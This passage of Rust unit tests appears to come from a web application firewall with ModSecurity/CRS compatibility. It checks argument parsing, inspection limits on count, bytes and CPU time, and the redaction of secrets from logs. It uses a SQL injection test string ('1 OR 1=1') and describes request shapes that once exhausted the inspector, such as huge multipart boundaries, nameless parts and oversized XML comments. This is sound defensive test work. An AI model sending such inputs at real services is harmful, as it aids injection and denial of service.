        ctx.uri = "/submit?q=1&q=2".parse().unwrap();
        let views = RequestViews::default();
        let target = |spec: TargetSpec| extract_target(&spec, &ctx, &views, None).unwrap();

        // A repeated QUERY name is still listed per value; a shared body name
        // once — the same verdict for any operator, and no copy per value.
        assert_eq!(
            target(TargetSpec::ArgsNames),
            ["q", "q", "a", "b.c", "password"]
        );
        // Counts are of names as sent, repeats included, as before.
        assert_eq!(
            target(TargetSpec::CountOf(Box::new(TargetSpec::ArgsNames))),
            ["8"]
        );
        assert_eq!(
            target(TargetSpec::CountOf(Box::new(TargetSpec::Args))),
            ["8"]
        );
        // q1 q2: 4; a v1 v2 v3: 9; b.c x: 4; password ×2: 2 × (8 + 10) = 36.
        assert_eq!(target(TargetSpec::ArgsCombinedSize), ["53"]);

        // Every value of a sensitive name is withheld, not only the first.
        let sensitive = collect_sensitive_values(&ctx, &views);
        assert!(
            sensitive.contains(&"s3cret-one".to_string()),
            "{sensitive:?}"
        );
        assert!(
            sensitive.contains(&"s3cret-two".to_string()),
            "{sensitive:?}"
        );

        // Values sharing a label are one place, not an ambiguity.
        let values = RequestValues::from_ctx(&ctx);
        assert_eq!(values.locate("ARGS", "v").as_deref(), Some("ARGS:a"));
        assert_eq!(
            values.locate("ARGS_NAMES", "b.c").as_deref(),
            Some("ARGS_NAMES:b.c")
        );
    }

    /// The boundary comes from Content-Type, with no length limit, and was
    /// searched for by comparing it at every offset: time in proportion to
    /// boundary length times body length.
    #[test]
    fn a_long_multipart_boundary_is_found_in_linear_time() {
        let boundary = format!("{}b", "-".repeat(256 * 1024));
        let ct = format!("multipart/form-data; boundary={boundary}");
        let ctx = body_ctx(&ct, vec![b'-'; MB]);
        assert!(
            finishes_in_time(move || drop(multipart_parts(&ctx, ArgBudget::UNLIMITED).unwrap())),
            "a {} KB boundary over 1 MB took over {BOUND:?}",
            boundary.len() / 1024
        );

        // And it still delimits parts.
        let body = format!(
            "--{boundary}\r\nContent-Disposition: form-data; name=\"q\"\r\n\r\n1 OR 1=1\r\n--{boundary}--\r\n"
        );
        let ctx = body_ctx(&ct, body.into_bytes());
        let fields = multipart_parts(&ctx, ArgBudget::UNLIMITED).unwrap().fields;
        assert_eq!(fields.iter().collect::<Vec<_>>(), [("q", "1 OR 1=1")]);
    }
}

// ---------------------------------------------------------------------------
// Inspection limit tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod inspection_limit_tests {
    use super::*;
    use crate::crs_compat::import_secrule_conf;
    use std::fmt::Write as _;
    use std::net::{IpAddr, Ipv4Addr};
    use std::sync::{Mutex, MutexGuard};
    use std::time::Duration;

    /// The refusal count is process-wide, so every test here that refuses a
    /// request holds this: a count one test reads is then its own.
    static SERIAL: Mutex<()> = Mutex::new(());

    fn serial() -> MutexGuard<'static, ()> {
        SERIAL.lock().unwrap_or_else(|e| e.into_inner())
    }

    fn ruleset(src: &str) -> CompiledRuleSet {
        crate::compile(import_secrule_conf(src).expect("import")).expect("compile")
    }

    /// What CRS does with arguments, in miniature: phase 1 reads the query
    /// string, phase 2 every argument collection. Rule 1 fires on a header
    /// before any argument is read; rule 29 fires on the LAST argument, so a
    /// run that reaches it inspected every one.
    const RULES: &str = r#"
SecRule REQUEST_HEADERS:User-Agent "@rx probe" "id:1,phase:1,pass,msg:'header rule'"
SecRule ARGS_GET "@rx never-a" "id:2,phase:1,pass"
SecRule ARGS "@rx never-b" "id:20,phase:2,pass,t:none,t:lowercase"
SecRule ARGS_NAMES "@rx never-c" "id:21,phase:2,pass"
SecRule FILES_NAMES|FILES "@rx never-d" "id:22,phase:2,pass"
SecRule ARGS "@rx ^last-value$" "id:29,phase:2,pass,msg:'last argument seen'"
"#;

    fn limits(max_args: u32, max_arg_bytes: u64, time_budget_ms: u32) -> InspectionLimits {
        InspectionLimits {
            max_args,
            max_arg_bytes,
            time_budget_ms,
        }
    }

    fn request(query: &str, content_type: &str, body: &str, l: InspectionLimits) -> RequestContext {
        let mut c = RequestContext::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 1);
        c.method = http::Method::POST;
        c.uri = format!("/form{query}").parse().unwrap();
        c.request_headers
            .insert("user-agent", "probe".parse().unwrap());
        if !content_type.is_empty() {
            c.request_headers
                .insert("content-type", content_type.parse().unwrap());
        }
        c.request_body = Some(bytes::Bytes::from(body.to_owned()));
        c.inspection_limits = l;
        c
    }

    /// Phase 1, then phase 2 unless phase 1 blocked — as the proxy runs them.
    fn run(rs: &CompiledRuleSet, c: &mut RequestContext) -> WafDecision {
        if evaluate(rs, c, Phase::RequestHeaders, 0) == WafDecision::Block {
            return WafDecision::Block;
        }
        evaluate(rs, c, Phase::RequestBody, 0)
    }

    fn fired(c: &RequestContext, id: &str) -> bool {
        c.rule_matches.iter().any(|m| m.rule_id == id)
    }

    fn refusals(c: &RequestContext) -> Vec<&RuleMatch> {
        c.rule_matches
            .iter()
            .filter(|m| InspectionLimit::of_rule(&m.rule_id).is_some())
            .collect()
    }

    /// `(shape, query, content type, body, bytes)`: `bytes` is what the
    /// argument limits charge — the names and values, and for multipart each
    /// part's header line too.
    type Shape = (&'static str, String, String, String, u64);

    /// `n` arguments `a0=v`, `a1=v`, … whose last value is `last-value`, in
    /// every shape a parser takes them in.
    fn shapes(n: usize) -> Vec<Shape> {
        let args: Vec<(String, String)> = (0..n)
            .map(|i| {
                let v = if i + 1 == n { "last-value" } else { "v" };
                (format!("a{i}"), v.to_string())
            })
            .collect();
        let bytes: u64 = args.iter().map(|(k, v)| (k.len() + v.len()) as u64).sum();
        let part_header = |k: &str| format!("Content-Disposition: form-data; name=\"{k}\"");
        let part_headers: u64 = args.iter().map(|(k, _)| part_header(k).len() as u64).sum();
        let pairs = |sep: &str| {
            args.iter()
                .map(|(k, v)| format!("{k}={v}"))
                .collect::<Vec<_>>()
                .join(sep)
        };
        let json = args
            .iter()
            .map(|(k, v)| format!("\"{k}\":\"{v}\""))
            .collect::<Vec<_>>()
            .join(",");
        let (mut xml, mut multipart) = (String::new(), String::new());
        for (k, v) in &args {
            write!(xml, "<{k}>{v}</{k}>").unwrap();
            write!(multipart, "--B\r\n{}\r\n\r\n{v}\r\n", part_header(k)).unwrap();
        }
        vec![
            (
                "query",
                format!("?{}", pairs("&")),
                String::new(),
                String::new(),
                bytes,
            ),
            (
                "urlencoded",
                String::new(),
                "application/x-www-form-urlencoded".into(),
                pairs("&"),
                bytes,
            ),
            (
                "json",
                String::new(),
                "application/json".into(),
                format!("{{{json}}}"),
                bytes,
            ),
            (
                "xml",
                String::new(),
                "application/xml".into(),
                format!("<r>{xml}</r>"),
                bytes,
            ),
            (
                "multipart",
                String::new(),
                "multipart/form-data; boundary=B".into(),
                format!("{multipart}--B--\r\n"),
                bytes + part_headers,
            ),
        ]
    }

    /// At a limit every argument is inspected; one past it the request is
    /// refused — never judged on the arguments that fitted and passed — with
    /// the limit's own built-in rule, for every parser that feeds ARGS.
    #[test]
    fn at_an_argument_limit_all_is_inspected_and_past_it_the_request_is_refused() {
        let _serial = serial();
        let rs = ruleset(RULES);
        for (shape, query, ct, body, bytes) in shapes(20) {
            let status = if shape == "query" { 414 } else { 413 };
            for (at, past, limit) in [
                (limits(20, 0, 0), limits(19, 0, 0), InspectionLimit::Args),
                (
                    limits(0, bytes, 0),
                    limits(0, bytes - 1, 0),
                    InspectionLimit::ArgBytes,
                ),
            ] {
                let mut c = request(&query, &ct, &body, at);
                assert_eq!(run(&rs, &mut c), WafDecision::Allow, "{shape} at {at:?}");
                assert!(
                    fired(&c, "29"),
                    "{shape} at {at:?}: the last argument was not inspected"
                );
                assert!(refusals(&c).is_empty(), "{shape} at {at:?}");
                assert_eq!(c.block_status, None);

                let mut c = request(&query, &ct, &body, past);
                assert_eq!(
                    run(&rs, &mut c),
                    WafDecision::Block,
                    "{shape} past {past:?}"
                );
                assert!(!fired(&c, "29"), "{shape}: judged on part of its arguments");
                assert!(fired(&c, "1"), "{shape}: the earlier finding must be kept");
                let detail = match limit {
                    InspectionLimit::Args => {
                        "more than 19 arguments (max_inspected_args)".to_string()
                    }
                    _ => format!(
                        "more than {} bytes of argument names and values (max_inspected_arg_bytes)",
                        bytes - 1
                    ),
                };
                assert_eq!(
                    c.block_reason.as_deref(),
                    Some(format!("inspection limit exceeded: {detail}").as_str()),
                    "{shape}"
                );
                assert_eq!(c.block_status, Some(status), "{shape}");
                let refused = refusals(&c);
                assert_eq!(refused.len(), 1, "{shape}");
                let m = refused[0];
                assert_eq!(m.rule_id, limit.rule_id(), "{shape}");
                assert_eq!(m.severity, Severity::Critical);
                assert_eq!(m.score, 0, "the refusal decides; it adds no score");
                assert_eq!(m.target, "", "no single field to exclude");
                assert_eq!(m.message, format!("Request not fully inspected: {detail}"));
                assert!(m.matched_value.is_empty());
            }
        }
    }

    /// ARGS holds the query string and the body together, so they share one
    /// budget: a request cannot double its allowance by splitting it.
    #[test]
    fn query_and_body_arguments_share_the_limits() {
        let _serial = serial();
        let rs = ruleset(RULES);
        let form = "application/x-www-form-urlencoded";
        let mut c = request(
            "?q1=1&q2=2&q3=3",
            form,
            "a0=v&a1=v&a2=last-value",
            limits(6, 0, 0),
        );
        assert_eq!(run(&rs, &mut c), WafDecision::Allow);
        assert!(fired(&c, "29"));

        // The query fits on its own; the body is what goes past.
        let mut c = request(
            "?q1=1&q2=2&q3=3",
            form,
            "a0=v&a1=v&a2=last-value",
            limits(5, 0, 0),
        );
        assert_eq!(run(&rs, &mut c), WafDecision::Block);
        assert_eq!(refusals(&c)[0].phase, Phase::RequestBody);
        assert_eq!(c.block_status, Some(413));

        // Here the query string alone is over, and phase 1 refuses it.
        let mut c = request("?q1=1&q2=2&q3=3", form, "a0=v", limits(2, 0, 0));
        assert_eq!(run(&rs, &mut c), WafDecision::Block);
        assert_eq!(refusals(&c)[0].phase, Phase::RequestHeaders);
        assert_eq!(c.block_status, Some(414));
    }

    /// A name several values share is inspected once (ARGS_NAMES lists it
    /// once), so its bytes are charged once; a file part is an argument (its
    /// name and filename are inspected) though not a parameter.
    #[test]
    fn shared_names_count_once_and_file_parts_count() {
        let _serial = serial();
        let rs = ruleset(RULES);
        // "k" + "aa" + "bb" + "last-value": 15 bytes; per value it would be 17.
        let json = r#"{"k":["aa","bb","last-value"]}"#;
        let mut c = request("", "application/json", json, limits(0, 15, 0));
        assert_eq!(run(&rs, &mut c), WafDecision::Allow);
        assert!(fired(&c, "29"));
        let mut c = request("", "application/json", json, limits(0, 14, 0));
        assert_eq!(run(&rs, &mut c), WafDecision::Block);

        let (field, file) = (
            "Content-Disposition: form-data; name=\"note\"",
            "Content-Disposition: form-data; name=\"doc\"; filename=\"a.txt\"",
        );
        let body = format!(
            "--B\r\n{field}\r\n\r\nlast-value\r\n\
             --B\r\n{file}\r\n\r\nfile body that no rule reads\r\n--B--\r\n"
        );
        let ct = "multipart/form-data; boundary=B";
        // note + last-value + doc + a.txt = 22 bytes, and each part's header
        // line; two arguments.
        let bytes = 22 + (field.len() + file.len()) as u64;
        for (l, want) in [
            (limits(2, bytes, 0), WafDecision::Allow),
            (limits(1, 0, 0), WafDecision::Block),
            (limits(0, bytes - 1, 0), WafDecision::Block),
        ] {
            let mut c = request("", ct, &body, l);
            assert_eq!(run(&rs, &mut c), want, "{l:?}");
        }
    }

    /// Every multipart part is an argument, and its header lines count as
    /// bytes: the 922 rules read them (MULTIPART_PART_HEADERS). A part with no
    /// name cost nothing and header lines added bytes nothing counted, so
    /// 9.9 MiB of nameless parts or of padding header lines was parsed and
    /// inspected in full under any argument limit.
    #[test]
    fn multipart_part_headers_and_nameless_parts_count() {
        let _serial = serial();
        let rs = ruleset(&format!(
            "{RULES}SecRule MULTIPART_PART_HEADERS \"@rx never-f\" \"id:24,phase:2,pass\"\n"
        ));
        let (named, pad, nameless) = (
            "Content-Disposition: form-data; name=\"note\"",
            "X-Pad: padding the part with header lines",
            "Content-Type: text/plain",
        );
        let body = format!(
            "--B\r\n{named}\r\n{pad}\r\n\r\nlast-value\r\n\
             --B\r\n{nameless}\r\n\r\na part with no name\r\n--B--\r\n"
        );
        let ct = "multipart/form-data; boundary=B";
        // note + last-value, and three header lines; two parts.
        let bytes = 14 + (named.len() + pad.len() + nameless.len()) as u64;
        let mut c = request("", ct, &body, limits(2, bytes, 0));
        assert_eq!(run(&rs, &mut c), WafDecision::Allow);
        assert!(fired(&c, "29"));
        for (l, limit) in [
            (limits(1, 0, 0), InspectionLimit::Args),
            (limits(0, bytes - 1, 0), InspectionLimit::ArgBytes),
        ] {
            let mut c = request("", ct, &body, l);
            assert_eq!(run(&rs, &mut c), WafDecision::Block, "{l:?}");
            assert_eq!(refusals(&c)[0].rule_id, limit.rule_id(), "{l:?}");
        }

        // Many nameless parts: refused at the argument limit.
        let mut many = String::new();
        for _ in 0..100 {
            write!(many, "--B\r\n{nameless}\r\n\r\nx\r\n").unwrap();
        }
        many.push_str("--B--\r\n");
        let mut c = request("", ct, &many, limits(50, 0, 0));
        assert_eq!(run(&rs, &mut c), WafDecision::Block);
        assert_eq!(refusals(&c)[0].rule_id, InspectionLimit::Args.rule_id());
    }

    /// Rules that read the body whole, as CRS 920/921/931/944 do.
    const RAW_RULES: &str = r#"
SecRule REQUEST_HEADERS:User-Agent "@rx probe" "id:1,phase:1,pass,msg:'header rule'"
SecRule REQUEST_BODY "@rx never-e" "id:23,phase:2,pass,t:none,t:lowercase"
SecRule REQUEST_BODY "@rx last-value$" "id:30,phase:2,pass,msg:'whole body seen'"
SecRule REQUEST_BODY "@rx ." "id:31,phase:2,pass,msg:'body read'"
"#;

    /// A body no parser takes apart reaches the rules only as REQUEST_BODY,
    /// read whole. It is one argument of its whole length: it was read whole
    /// past `max_inspected_arg_bytes`, up to `max_body_size` (a 10 MiB
    /// octet-stream body ran to the 10 s time budget), and the argument limits
    /// never applied to it.
    #[test]
    fn a_body_no_parser_takes_apart_is_one_argument_of_its_whole_length() {
        let _serial = serial();
        let rs = ruleset(RAW_RULES);
        let body = format!("{}last-value", "x".repeat(90));
        let n = body.len() as u64;
        for ct in [
            "text/plain",
            "text/csv",
            "application/octet-stream",
            "multipart/related; boundary=B",
            "",
        ] {
            // The query string's `q` and `1`, and the body.
            let mut c = request("?q=1", ct, &body, limits(2, n + 2, 0));
            assert_eq!(run(&rs, &mut c), WafDecision::Allow, "{ct:?} at the limits");
            assert!(fired(&c, "30"), "{ct:?}: the body was not read whole");
            assert!(refusals(&c).is_empty(), "{ct:?}");

            // One byte over: refused before any rule reads the body.
            let mut c = request("?q=1", ct, &body, limits(0, n + 1, 0));
            assert_eq!(run(&rs, &mut c), WafDecision::Block, "{ct:?}");
            assert!(!fired(&c, "30"), "{ct:?}: read whole past the byte limit");
            assert!(fired(&c, "1"), "{ct:?}: the earlier finding must be kept");
            let refused = refusals(&c);
            assert_eq!(refused.len(), 1, "{ct:?}");
            assert_eq!(refused[0].rule_id, InspectionLimit::ArgBytes.rule_id());
            assert_eq!(refused[0].phase, Phase::RequestBody);
            assert_eq!(c.block_status, Some(413), "{ct:?}");
            assert_eq!(
                c.block_reason.as_deref(),
                Some(
                    format!(
                        "inspection limit exceeded: more than {} bytes of argument names and \
                         values (max_inspected_arg_bytes)",
                        n + 1
                    )
                    .as_str()
                ),
            );

            // The body is an argument, with the query string's.
            let mut c = request("?q=1", ct, &body, limits(1, 0, 0));
            assert_eq!(run(&rs, &mut c), WafDecision::Block, "{ct:?}");
            assert_eq!(refusals(&c)[0].rule_id, InspectionLimit::Args.rule_id());
        }

        // Charged as the rules read it: a byte that is not UTF-8 is read as
        // U+FFFD, three bytes.
        let mut c = request("", "application/octet-stream", "", limits(0, 6, 0));
        c.request_body = Some(bytes::Bytes::from_static(b"\xff\xfe"));
        assert_eq!(run(&rs, &mut c), WafDecision::Allow);
        let mut c = request("", "application/octet-stream", "", limits(0, 5, 0));
        c.request_body = Some(bytes::Bytes::from_static(b"\xff\xfe"));
        assert_eq!(run(&rs, &mut c), WafDecision::Block);

        // No body, nothing to charge: a query string at the argument limit
        // still passes a REQUEST_BODY rule.
        let mut c = request("?a=1&b=2", "text/plain", "", limits(2, 0, 0));
        assert_eq!(run(&rs, &mut c), WafDecision::Allow);
    }

    /// A body a parser takes apart is read whole by REQUEST_BODY rules too.
    /// Its arguments were charged as they were parsed and are not charged
    /// again; but a body past the limits is refused before it is read whole,
    /// even by rules that read no argument.
    #[test]
    fn a_parsed_body_past_the_limits_is_refused_before_it_is_read_whole() {
        let _serial = serial();
        let rs = ruleset(RAW_RULES);
        for (shape, _, ct, body, bytes) in shapes(20).into_iter().filter(|(s, ..)| *s != "query") {
            // Charged as its arguments only: the body itself is longer.
            assert!(body.len() as u64 > bytes, "{shape}");
            let mut c = request("", &ct, &body, limits(20, bytes, 0));
            assert_eq!(run(&rs, &mut c), WafDecision::Allow, "{shape}");
            assert!(refusals(&c).is_empty(), "{shape}");

            for l in [limits(19, 0, 0), limits(0, bytes - 1, 0)] {
                let mut c = request("", &ct, &body, l);
                assert_eq!(run(&rs, &mut c), WafDecision::Block, "{shape} {l:?}");
                assert_eq!(refusals(&c).len(), 1, "{shape} {l:?}");
                assert!(!fired(&c, "30"), "{shape} {l:?}: read whole past a limit");
            }
        }
    }

    /// A parsed body's bytes need not be arguments: an XML comment, one JSON
    /// key repeated in every object of an array (a shared name is charged
    /// once), nulls, whitespace. The argument limits barely charged such a
    /// body while REQUEST_BODY rules read all of it: 10 MiB in one XML comment
    /// cost 4.0 s, a 2 KiB key in 4000 objects 3.3 s. Read whole, a parsed body
    /// may be `WHOLE_BODY_FACTOR` times the byte limit — what encodings and
    /// markup take beyond the arguments they carry.
    #[test]
    fn a_parsed_body_read_whole_is_held_to_a_multiple_of_the_byte_limit() {
        let _serial = serial();
        let rs = ruleset(RAW_RULES);
        let cases = [
            (
                "application/xml",
                format!("<r><a>last-value</a><!-- {} --></r>", "x".repeat(400)),
            ),
            (
                "application/json",
                format!(
                    "[{}]",
                    vec![format!("{{\"{}\":1}}", "k".repeat(98)); 4].join(",")
                ),
            ),
            ("application/json", format!("[{}null]", "null,".repeat(80))),
        ];
        for (ct, body) in cases {
            let len = body.len() as u64;
            // A limit the arguments are well within, and the body within
            // four times; then the smallest limit the body is past.
            let at = len.div_ceil(WHOLE_BODY_FACTOR);
            let mut c = request("", ct, &body, limits(0, at, 0));
            assert_eq!(run(&rs, &mut c), WafDecision::Allow, "{ct} {len}");
            assert!(refusals(&c).is_empty());
            assert!(fired(&c, "31"), "{ct}");

            let mut c = request("", ct, &body, limits(0, at - 1, 0));
            assert_eq!(run(&rs, &mut c), WafDecision::Block, "{ct} {len}");
            let refused = refusals(&c);
            assert_eq!(refused.len(), 1);
            assert_eq!(refused[0].rule_id, InspectionLimit::ArgBytes.rule_id());
            assert_eq!(c.block_status, Some(413));
            assert_eq!(
                c.block_reason.as_deref(),
                Some(
                    format!(
                        "inspection limit exceeded: more than {} bytes of argument names and \
                         values (max_inspected_arg_bytes); read whole, the body is {len} bytes, \
                         more than the {} its encoding and markup may take",
                        at - 1,
                        (at - 1) * WHOLE_BODY_FACTOR
                    )
                    .as_str()
                ),
            );
            assert!(!fired(&c, "31"), "{ct}: read whole past the limit");
        }
    }

    /// The budget is charged as the parser goes: a request far past a limit
    /// costs the limit to parse, not what the client sent.
    #[test]
    fn parsing_stops_at_the_first_argument_past_a_limit() {
        for (l, limit) in [
            (limits(10, 0, 0), InspectionLimit::Args),
            (limits(0, 30, 0), InspectionLimit::ArgBytes),
        ] {
            let pulled = Cell::new(0usize);
            let pairs = (0..1_000_000).map(|i| {
                pulled.set(pulled.get() + 1);
                (format!("n{i}"), "v".to_string())
            });
            let err = Params::from_pairs(pairs, ArgBudget::of(&l)).unwrap_err();
            assert_eq!(err, Unlisted::OverLimit(limit));
            // Ten 3-byte arguments fit either limit; the eleventh is refused.
            assert_eq!(pulled.get(), 11, "{limit:?}");
        }
    }

    /// 0 is "no limit", as for the proxy's other request limits; a context
    /// nothing stamped is unbounded.
    #[test]
    fn zero_means_no_limit() {
        let rs = ruleset(RULES);
        for (shape, query, ct, body, _) in shapes(200) {
            let mut c = request(&query, &ct, &body, InspectionLimits::default());
            assert_eq!(run(&rs, &mut c), WafDecision::Allow, "{shape}");
            assert!(fired(&c, "29"), "{shape}");
        }
    }

    /// The time budget is read every `CLOCK_EVERY` instructions. The test hook
    /// moves the clock a fixed step per read, so the budget runs out at the
    /// first check without a slow request.
    #[test]
    fn the_time_budget_refuses_an_evaluation_that_runs_past_it() {
        let _serial = serial();
        // Enough rules that phase 2 runs well past CLOCK_EVERY instructions.
        let mut src = String::from(RULES);
        for i in 0..40 {
            src.push_str(&format!(
                "SecRule ARGS \"@rx never-{i}\" \"id:{},phase:2,pass\"\n",
                100 + i
            ));
        }
        let rs = ruleset(&src);
        assert!(rs.phase_programs[Phase::RequestBody as usize].len() > 2 * CLOCK_EVERY as usize);
        let form = "application/x-www-form-urlencoded";

        // The clock moves 51 ms per read against a 50 ms budget.
        crate::test_hooks::set_eval_clock_step(Duration::from_millis(51));
        let mut c = request("", form, "a=last-value", limits(0, 0, 50));
        let decision = run(&rs, &mut c);
        // No budget, no clock: the same hook changes nothing.
        let mut unbudgeted = request("", form, "a=last-value", limits(0, 0, 0));
        let unbudgeted_decision = run(&rs, &mut unbudgeted);
        crate::test_hooks::set_eval_clock_step(Duration::ZERO);

        assert_eq!(decision, WafDecision::Block);
        let refused = refusals(&c);
        assert_eq!(refused.len(), 1);
        assert_eq!(refused[0].rule_id, InspectionLimit::Time.rule_id());
        assert_eq!(refused[0].phase, Phase::RequestBody);
        assert_eq!(refused[0].target, "");
        // The same for every request refused under this budget; how long this
        // one ran is in the reason.
        assert_eq!(
            refused[0].message,
            "Request not fully inspected: rule evaluation passed the 50 ms time budget \
             (inspection_time_budget_ms)"
        );
        let reason = c.block_reason.as_deref().unwrap();
        assert!(
            reason.starts_with(
                "inspection limit exceeded: rule evaluation passed the 50 ms time budget \
                 (inspection_time_budget_ms); stopped after "
            ),
            "{reason}"
        );
        assert_eq!(c.block_status, None, "a time refusal answers 403");
        assert!(
            fired(&c, "1"),
            "findings before the budget ran out are kept"
        );
        assert_eq!(unbudgeted_decision, WafDecision::Allow);
        assert!(fired(&unbudgeted, "29"));

        // With the real clock, a 50 ms budget is far above this request.
        let mut c = request("", form, "a=last-value", limits(0, 0, 50));
        assert_eq!(run(&rs, &mut c), WafDecision::Allow);
        assert!(fired(&c, "29"));
    }

    /// A rule that blocks decides the request. The clock was read before the
    /// Block early exit, so a budget found spent at the very next instruction
    /// overwrote the rule's verdict: the event named the time budget, its
    /// advice said to raise it (which would change nothing), and the time
    /// reason was counted. Markers are one instruction each, so some count of
    /// them puts the deny's last instruction just before a clock read.
    #[test]
    fn a_rule_s_block_stands_when_the_budget_runs_out_just_after_it() {
        let _serial = serial();
        // A rule after the deny, so the loop comes round again.
        let deny = "SecRule REQUEST_HEADERS:User-Agent \"@rx probe\" \
                    \"id:50,phase:2,deny,status:403,msg:'denied'\"\n\
                    SecRule ARGS \"@rx never\" \"id:51,phase:2,pass\"\n";
        let form = "application/x-www-form-urlencoded";
        let mut decided_by_the_rule = 0;
        crate::test_hooks::set_eval_clock_step(Duration::from_millis(51));
        for n in 0..CLOCK_EVERY {
            let mut src = String::new();
            for i in 0..n {
                writeln!(src, "SecMarker \"pad-{i}\"").unwrap();
            }
            src.push_str(deny);
            let rs = ruleset(&src);
            let mut c = request("", form, "a=v", limits(0, 0, 50));
            evaluate(&rs, &mut c, Phase::RequestBody, 0);
            // Past the deny, the budget is found spent before it runs: that
            // is a time refusal, and right.
            if fired(&c, "50") {
                decided_by_the_rule += 1;
                assert!(refusals(&c).is_empty(), "{n} markers: {:?}", c.rule_matches);
                assert_eq!(c.block_reason.as_deref(), Some("denied"), "{n} markers");
            }
        }
        crate::test_hooks::set_eval_clock_step(Duration::ZERO);
        assert!(decided_by_the_rule > 0);
    }

    /// One instruction over a large value can take longer than many cheap
    /// ones: a transform chain and a regex over 10 MiB took about 0.4 s, and
    /// the clock was read only every `CLOCK_EVERY` instructions. After a load
    /// of `CLOCK_BYTES` or more it is read before every instruction, so the
    /// budget is overrun by at most one. This program is shorter than
    /// `CLOCK_EVERY`, so before, the clock was never read at all.
    #[test]
    fn after_a_large_load_the_clock_is_read_every_instruction() {
        let _serial = serial();
        let rs = ruleset(RULES);
        assert!(rs.phase_programs[Phase::RequestBody as usize].len() < CLOCK_EVERY as usize);
        let form = "application/x-www-form-urlencoded";
        let large = format!("a={}&z=last-value", "x".repeat(CLOCK_BYTES));
        crate::test_hooks::set_eval_clock_step(Duration::from_millis(51));
        let mut c = request("", form, &large, limits(0, 0, 50));
        let decision = run(&rs, &mut c);
        let mut small = request("", form, "z=last-value", limits(0, 0, 50));
        let small_decision = run(&rs, &mut small);
        crate::test_hooks::set_eval_clock_step(Duration::ZERO);

        assert_eq!(decision, WafDecision::Block);
        let refused = refusals(&c);
        assert_eq!(refused.len(), 1);
        assert_eq!(refused[0].rule_id, InspectionLimit::Time.rule_id());
        assert!(
            !fired(&c, "29"),
            "the budget was found spent only at the end"
        );
        // A small request is read every CLOCK_EVERY instructions, as before.
        assert_eq!(small_decision, WafDecision::Allow);
        assert!(fired(&small, "29"));
    }

    /// The budget is CPU time this thread spends evaluating. Wall time also
    /// counted time the thread spent descheduled — a busy node, as in a
    /// flood — so a heavy but legitimate request could be refused for the
    /// load around it. The wall clock still decides when the CPU clock is
    /// worth reading: a thread uses no more CPU time than wall time passes.
    #[test]
    fn time_the_thread_spends_descheduled_is_not_held_against_the_request() {
        let _serial = serial();
        let mut src = String::from(RULES);
        for i in 0..40 {
            src.push_str(&format!(
                "SecRule ARGS \"@rx never-{i}\" \"id:{},phase:2,pass\"\n",
                100 + i
            ));
        }
        let rs = ruleset(&src);
        let form = "application/x-www-form-urlencoded";
        // The wall clock moves 51 ms per read; the CPU clock does not.
        crate::test_hooks::set_eval_wall_clock_step(Duration::from_millis(51));
        let mut c = request("", form, "a=last-value", limits(0, 0, 50));
        let decision = run(&rs, &mut c);
        crate::test_hooks::set_eval_clock_step(Duration::ZERO);
        assert_eq!(decision, WafDecision::Allow, "{:?}", c.block_reason);
        assert!(refusals(&c).is_empty());
        assert!(fired(&c, "29"));
    }

    /// The hooks above stand in for the clocks; this is the real CPU clock:
    /// present on Linux, and moving with work done on this thread.
    #[cfg(target_os = "linux")]
    #[test]
    fn the_thread_cpu_clock_is_read_and_moves_with_work() {
        let before = thread_cpu_time().expect("CLOCK_THREAD_CPUTIME_ID");
        let mut x = 0u64;
        for i in 0..20_000_000u64 {
            x = std::hint::black_box(x.wrapping_mul(31).wrapping_add(i));
        }
        let after = thread_cpu_time().expect("CLOCK_THREAD_CPUTIME_ID");
        assert!(after > before, "{before:?} -> {after:?} ({x})");
    }

    /// In learning mode the proxy turns the Block into a logged would-block
    /// and runs the next phase, which meets the same limit: one request is
    /// still one refusal, recorded and counted once.
    #[test]
    fn a_refusal_is_recorded_and_counted_once_per_request() {
        let _serial = serial();
        let rs = ruleset(RULES);
        let before = sentinel_telemetry::inspection_limit_exceeded_total("args");
        let mut c = request("?q1=1&q2=2&q3=3", "", "", limits(2, 0, 0));
        assert_eq!(
            evaluate(&rs, &mut c, Phase::RequestHeaders, 0),
            WafDecision::Block
        );
        // What the proxy's enforce_mode does in learning mode.
        c.decision = WafDecision::Log;
        c.would_block = true;
        assert_eq!(
            evaluate(&rs, &mut c, Phase::RequestBody, 0),
            WafDecision::Block
        );
        assert_eq!(refusals(&c).len(), 1);
        assert_eq!(
            sentinel_telemetry::inspection_limit_exceeded_total("args"),
            before + 1
        );
    }

    /// The metric's reason labels are the limits' own.
    #[test]
    fn every_limit_is_a_metric_reason() {
        let reasons: Vec<&str> = InspectionLimit::ALL.iter().map(|l| l.reason()).collect();
        assert_eq!(reasons, sentinel_telemetry::inspection_limit_reasons());
    }

    /// Arguments past a limit were never parsed, so which of them are secret
    /// is unknown: the whole query string stands in for them, and the logger's
    /// locator lists none of them.
    #[test]
    fn arguments_past_a_limit_are_withheld_whole_and_not_listed() {
        let c = request(
            "?password=hunter2-secret&a=1&b=2",
            "application/x-www-form-urlencoded",
            "token=abcdef-123456",
            limits(1, 0, 0),
        );
        let views = RequestViews::default();
        let sensitive = collect_sensitive_values(&c, &views);
        assert!(
            value_is_sensitive(&sensitive, "hunter2-secret"),
            "{sensitive:?}"
        );
        assert!(
            value_is_sensitive(&sensitive, "abcdef-123456"),
            "{sensitive:?}"
        );

        let values = RequestValues::from_ctx(&c);
        assert!(values
            .entries
            .iter()
            .all(|(coll, _, _)| !matches!(coll, Collection::ArgsGet | Collection::ArgsPost)));
        assert!(values
            .entries
            .iter()
            .any(|(coll, _, v)| *coll == Collection::Body && v == "token=abcdef-123456"));
    }
}
